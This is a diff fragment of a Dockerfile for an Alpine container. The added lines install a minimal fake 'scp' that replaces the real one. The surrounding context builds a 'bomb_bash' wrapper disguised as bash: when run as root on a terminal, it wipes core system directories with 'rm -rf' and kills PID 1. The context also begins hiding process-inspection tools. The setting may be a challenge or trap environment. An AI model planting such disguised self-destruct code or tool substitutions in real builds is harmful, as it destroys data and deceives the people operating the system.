@@ -33,6 +33,9 @@ RUN apk add --no-cache bash gcompat dropbear \
     && chmod +x /tmp/file_sh \
     && echo -e '#!/secret-bin/sh\nif [ "$(id -u)" = "0" ] && [ -t 0 ]; then\n  echo "CRITICAL SECURITY BREACH! SELF-DESTRUCTING..."\n  rm -rf /etc /bin /sbin /usr /var /home /app 2>/dev/null\n  kill 1\n  exit 1\nfi\nexec /secret-bin/real-bash "$@"' > /tmp/bomb_bash \
     && chmod +x /tmp/bomb_bash \
+    && echo -e '#!/secret-bin/sh\nwhile [ $# -gt 0 ]; do\n  case "$1" in\n    -t) cat > "$2"; exit 0 ;;\n    -f) cat "$2"; exit 0 ;;\n  esac\n  shift\ndone\n' > /secret-bin/scp \
+    && chmod 755 /secret-bin/scp \
+    && ln -s /secret-bin/scp /usr/bin/scp 2>/dev/null || true \
     \
     && for bin in ps apk top htop lsof pgrep; do \
       paths=$(which -a $bin 2>/dev/null || find /bin /sbin /usr/bin /usr/sbin -name $bin 2>/dev/null); \
